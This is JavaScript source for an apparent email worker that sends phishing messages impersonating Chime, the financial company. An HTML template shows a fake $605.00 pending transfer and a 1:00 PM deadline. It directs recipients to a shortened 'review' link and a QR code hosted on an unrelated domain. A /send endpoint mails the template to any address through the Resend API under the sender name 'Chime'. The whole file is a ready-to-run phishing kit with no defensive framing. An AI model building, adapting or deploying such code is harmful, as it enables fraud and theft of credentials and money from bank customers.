const SENDER_DOMAIN = 'jesusgeneration.vip';
const SENDER_NAME = 'Chime';

const LOGO_URL = 'https://jesusgeneration.vip/Logo.png.PNG';
const QR_URL = 'https://jesusgeneration.vip/qrcode_o0le.png';
const REVIEW_URL = 'https://shr.pn/Chime-security-';

const getHTML = (firstName) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#ECF9EE;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;padding:24px 12px}
    .wrap{max-width:600px;margin:0 auto;background:white;border-radius:4px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,0.10)}
    .hdr{background:#ECF9EE;padding:24px 36px;text-align:center}
    .body{padding:36px 36px 0;background:white}
    .greeting{font-size:22px;font-weight:700;color:#111;margin-bottom:14px}
    p{font-size:15px;line-height:1.75;color:#444;margin-bottom:12px}
    .txn{background:#ECF9EE;border:1px solid #d4f0da;border-left:4px solid #1EC677;border-radius:6px;padding:18px 20px;margin:20px 0}
    .txn-lbl{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:1.2px;color:#999;margin-bottom:5px}
    .txn-amt{font-size:30px;font-weight:700;color:#111;margin-bottom:4px}
    .txn-det{font-size:13px;color:#777}
    .btn-wrap{text-align:center;margin:28px 0 24px}
    .btn{display:inline-block;background:#1EC677;color:white;padding:16px 52px;border-radius:8px;font-size:16px;font-weight:600;text-decoration:none;font-family:Arial,sans-serif;letter-spacing:0.2px}
    .btn-link{display:inline-block;margin-top:12px;color:#1EC677;font-size:14px;text-decoration:none}
    .qr-wrap{background:#ECF9EE;border:1px solid #d4f0da;border-radius:10px;padding:26px 20px;text-align:center;margin:8px 0 24px}
    .qr-title{font-size:16px;font-weight:600;color:#111;margin-bottom:6px}
    .qr-sub{font-size:13px;color:#777;line-height:1.6;margin-bottom:22px;max-width:360px;margin-left:auto;margin-right:auto}
    .qr-img{width:200px;height:200px;border-radius:10px;border:1px solid #d4f0da;background:white;padding:14px;display:block;margin:0 auto 20px}
    .steps{display:flex;justify-content:center;gap:20px;margin-bottom:16px;flex-wrap:wrap}
    .step{display:flex;align-items:center;gap:6px;font-size:12px;color:#666}
    .sn{width:20px;height:20px;background:#1EC677;border-radius:50%;color:white;font-size:11px;font-weight:700;display:inline-flex;align-items:center;justify-content:center}
    .expiry{font-size:13px;color:#888;line-height:1.6}
    .expiry strong{color:#333}
    .closing{padding:0 36px 28px;background:white}
    .divider{height:1px;background:#ECF9EE;margin:20px 0}
    .small{font-size:13px;color:#999;line-height:1.7;margin-bottom:8px}
    .signoff{font-size:15px;font-weight:600;color:#222;margin-top:18px}
    .ftr{background:#0D4029;padding:32px 36px;text-align:center}
    .ftr-logo-box{display:inline-block;padding:10px 18px;border-radius:6px;margin-bottom:20px;border:1px solid rgba(255,255,255,0.15)}
    .ftr-logo-text{font-size:22px;font-weight:700;color:white;letter-spacing:-0.5px;font-family:Georgia,serif}
    .ftr-social{display:flex;justify-content:center;gap:20px;margin-bottom:20px}
    .ftr-social a{display:inline-block;width:32px;height:32px;border-radius:50%;background:rgba(255,255,255,0.12);text-align:center;line-height:32px;font-size:14px;color:white;text-decoration:none}
    .ftr p{font-size:11px;color:rgba(255,255,255,0.60);line-height:1.8;margin-bottom:8px}
    .ftr a{color:rgba(255,255,255,0.60);text-decoration:none}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="hdr"><img src="${LOGO_URL}" width="180" style="display:block;margin:0 auto;" alt="chime"/></div>
    <div class="body">
      <div class="greeting">Hi ${firstName},</div>
      <p>We noticed a transaction is currently pending on your Chime account that requires your attention.</p>
      <div class="txn">
        <div class="txn-lbl">Pending Transaction</div>
        <div class="txn-amt">$605.00</div>
        <div class="txn-det">To: James R. &middot; Initiated today at 9:47 AM EST</div>
      </div>
      <p>If you authorized this transaction no action is needed and we will process it automatically.</p>
      <p>If you did not authorize this transaction please verify below so we can place this on hold for your protection.</p>
      <div class="btn-wrap">
        <a href="${REVIEW_URL}" class="btn">Review This Transaction &rarr;</a>
        <a href="${REVIEW_URL}" class="btn-link">Review this transaction online</a>
      </div>
      <div class="qr-wrap">
        <div class="qr-title">&#128274; Scan to Verify Your Identity</div>
        <p class="qr-sub">For enhanced account security we now require mobile verification for transaction confirmations. Open your camera app and scan the code below to confirm or cancel this transaction.</p>
        <img class="qr-img" src="${QR_URL}" alt="Scan to verify"/>
        <div class="steps">
          <div class="step"><span class="sn">1</span><span>Open camera app</span></div>
          <div class="step"><span class="sn">2</span><span>Point at QR code</span></div>
          <div class="step"><span class="sn">3</span><span>Tap notification</span></div>
        </div>
        <p class="expiry">This verification expires at <strong>1:00 PM today.</strong><br>After this time the transaction will be processed automatically.</p>
      </div>
    </div>
    <div class="closing">
      <div class="divider"></div>
      <p class="small">If you have any questions please contact our Member Services team at <a href="#">support@chime.com</a> or call <strong style="color:#444">1-844-244-6363</strong>.</p>
      <p class="small">Thank you for being a Chime member.</p>
      <p class="signoff">The Chime Team</p>
    </div>
    <div class="ftr">
      <div class="ftr-logo-box"><span class="ftr-logo-text">chime</span></div>
      <div class="ftr-social"><a href="#">&#x1F4F7;</a><a href="#">&#x1D54F;</a><a href="#">&#x266B;</a><a href="#">&#x1F426;</a></div>
      <p>&#169;2026 Chime Financial, Inc. All rights reserved.</p>
      <p>PO Box 417, San Francisco, CA 94104</p>
      <p style="margin-top:12px;">Please do not reply to this email. The account is not monitored.</p>
      <p style="margin-top:12px;">Chime&reg; is a financial technology company, not an FDIC-insured bank.</p>
    </div>
  </div>
</body>
</html>`;

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const cors = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    if (request.method === 'OPTIONS') return new Response(null, { headers: cors });

    if (url.pathname === '/' && request.method === 'GET') {
      return new Response(JSON.stringify({ status: "Email API ready", domain: SENDER_DOMAIN, timestamp: new Date().toISOString() }), { headers: { ...cors, 'Content-Type': 'application/json' }});
    }

    if (url.pathname === '/send' && request.method === 'POST') {
      try {
        const body = await request.json();
        const to = body.to;
        const firstName = body.firstName || 'Member';

        if (!to || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(to)) {
          return new Response(JSON.stringify({ error: "Invalid email" }), { status: 400, headers: { ...cors, 'Content-Type': 'application/json' }});
        }

        if (!env.RESEND_API_KEY) {
          return new Response(JSON.stringify({ error: "Missing API key" }), { status: 500, headers: { ...cors, 'Content-Type': 'application/json' }});
        }

        const res = await fetch('https://api.resend.com/emails', {
          method: 'POST',
          headers: { 'Authorization': `Bearer ${env.RESEND_API_KEY}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({
            from: `${SENDER_NAME} <security@${SENDER_DOMAIN}>`,
            to: [to],
            subject: 'Your $605.00 transfer to James R. is pending',
            html: getHTML(firstName),
            headers: { 'List-Unsubscribe': `<mailto:unsubscribe@${SENDER_DOMAIN}?list=chime>, <https://${SENDER_DOMAIN}/unsubscribe>` }
          })
        });

        const data = await res.json();
        if (!res.ok) return new Response(JSON.stringify({ error: data }), { status: 400, headers: { ...cors, 'Content-Type': 'application/json' }});

        return new Response(JSON.stringify({ success: true, id: data.id, sentTo: to, firstName, domain: SENDER_DOMAIN }), { headers: { ...cors, 'Content-Type': 'application/json' }});

      } catch (err) {
        return new Response(JSON.stringify({ error: err.message }), { status: 500, headers: { ...cors, 'Content-Type': 'application/json' }});
      }
    }

    return new Response(JSON.stringify({ error: 'Not found' }), { status: 404, headers: { ...cors, 'Content-Type': 'application/json' }});
  }
};